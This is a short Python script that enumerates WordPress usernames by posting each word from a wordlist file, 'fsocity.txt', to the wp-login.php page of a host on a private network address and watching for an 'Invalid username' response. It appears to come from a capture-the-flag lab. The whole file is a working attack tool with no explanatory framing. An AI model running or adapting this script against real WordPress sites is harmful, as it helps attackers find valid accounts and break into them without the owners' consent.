import requests

# https://stackoverflow.com/questions/25091976/python-requests-get-cookies
session = requests.Session()

response = session.get('http://192.168.0.12/wp-login.php')
cookies = session.cookies.get_dict()

# log=bttai&pwd=buitai&wp-submit=Log+In&redirect_to=http%3A%2F%2F192.168.0.12%2Fwp-admin%2F&testcookie=1

count = 0
data = {
		"pwd" : "buitai",
		"wp-submit" : "Log+In",
		"redirect_to" : "http://192.168.0.12/wp-admin/",
		"testcookie" : "1",
		}

with open("fsocity.txt", "r") as f:
	raw_words = f.read()
	for username in raw_words.split():
		data['log'] = username
		response = session.post('http://192.168.0.12/wp-login.php', data=data, cookies=cookies)
		if "Invalid username" not in response.text:
			print("[*] " +username)
			break
		else:
			print("[-] " + username)




